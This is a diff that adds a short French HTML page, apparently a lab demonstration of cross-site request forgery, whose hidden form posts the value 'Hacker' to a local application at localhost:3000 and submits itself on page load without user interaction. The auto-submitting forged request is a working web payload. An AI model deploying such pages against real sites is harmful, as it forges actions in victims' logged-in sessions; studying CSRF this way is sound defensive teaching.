@@ -1,0 +1,16 @@
+<html>
+
+<body>
+    <h1>Vous avez été attaqué par un CSRF !</h1>
+    <form action="http://localhost:3000/process" method="POST">
+        <input type="hidden" name="name" value="Hacker">
+        <input type="submit" value="Soumettre automatiquement">
+    </form>
+
+    <script>
+        // Soumettre automatiquement le formulaire sans interaction utilisateur
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
